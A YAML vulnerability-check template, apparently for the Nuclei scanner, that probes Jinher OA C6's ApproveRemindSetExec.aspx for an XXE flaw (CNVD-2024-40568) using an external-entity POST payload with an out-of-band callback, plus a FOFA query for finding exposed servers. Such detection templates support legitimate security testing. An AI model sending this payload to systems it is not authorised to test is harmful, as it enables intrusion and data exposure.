id: jinher-oa-c6-ApproveRemindSetExec-xxe
info:
  name: 金和 OA c6 ApproveRemindSetExec.aspx - xxe (CNVD-2024-40568)
  author: leadlife
  severity: critical
  description: 金和OA-C6系统接口ApproveRemindSetExec.aspx存在XXE漏洞，攻击者可利用xxe漏洞获取服务器敏感数据，可读取任意文件以及ssrf攻击，存在一定的安全隐患。
  reference: 
    - https://github.com/wy876/POC/blob/e9ebc9ab7da2132f9afa9e813bfa98b15375ffca/%E9%87%91%E5%92%8COA/%E9%87%91%E5%92%8COA-C6%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3ApproveRemindSetExec.aspx%E5%AD%98%E5%9C%A8XXE%E6%BC%8F%E6%B4%9E(CNVD-2024-40568).md
  metadata:
    verified: true
    fofa-query: body="/jc6/platform/sys/login" || body="JHSoft.Web.AddMenu" || app="金和网络-金和OA" || "JC6金和协同管理平台"
  tags: jinher,oa,xxe,2024,oob

http:
  - raw:
      - |
        POST /c6/JHSoft.Web.AddMenu/ApproveRemindSetExec.aspx/? HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
        Content-Type: application/xml

        <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{interactsh-url}}"> %remote;]>

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"
        condition: or